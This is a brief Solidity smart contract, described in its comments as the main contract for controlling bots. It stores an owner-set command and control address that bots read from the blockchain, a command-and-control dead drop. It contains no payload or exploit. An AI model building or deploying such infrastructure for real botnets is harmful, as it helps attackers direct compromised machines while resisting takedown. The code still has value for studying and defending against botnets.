pragma solidity >=0.4.0 <0.6.0;

/// @title Main contract for controlling bots
/// @author Doshmajhan
contract Controller {
    address owner;
    string command;
    string control_address;

    constructor() public {
        owner = msg.sender;
    }

    /// @notice Sets the command for the bots to pull down
    /// @param new_command The new command to be stored
    function set_command(string memory new_command) public {
        require(msg.sender == owner, "Must be owner");
        command = new_command;
    }

    /// @notice Sets the control_address for the bots to pull down
    /// @param new_control_address The new command to be stored
    function set_control_address(string memory new_control_address) public {
        require(msg.sender == owner, "Must be owner");
        control_address = new_control_address;
    }

    /// @notice Gets the current command stored for the bot to run
    /// @return The current stored command
    function get_command() public view returns (string memory) {
        return command;
    }

    /// @notice Gets the current control_address stored for the bot to access
    /// @return The current stored control_address
    function get_control_address() public view returns (string memory) {
        return control_address;
    }

}